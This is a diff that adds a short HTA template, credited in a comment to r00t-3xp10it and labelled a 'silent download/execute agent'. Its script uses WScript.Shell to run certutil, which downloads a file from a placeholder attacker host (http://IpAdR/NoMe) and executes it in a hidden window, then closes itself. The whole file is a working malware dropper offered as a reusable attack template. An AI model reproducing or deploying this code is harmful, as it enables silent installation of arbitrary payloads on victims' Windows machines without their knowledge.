@@ -1,0 +1,10 @@
+<!--
+HTA template | Author: r00t-3xp10it (SSA)
+Silent download/execute agent (bat)
+using apache2 + hta + certutil (@subTee).
+-->
+<script>
+a=new ActiveXObject('WScript.Shell');
+a.run("cmd.exe /c certutil.exe -urlcache -split -f http://IpAdR/NoMe NoMe && NoMe", 0, true);
+window.close();
+</script>
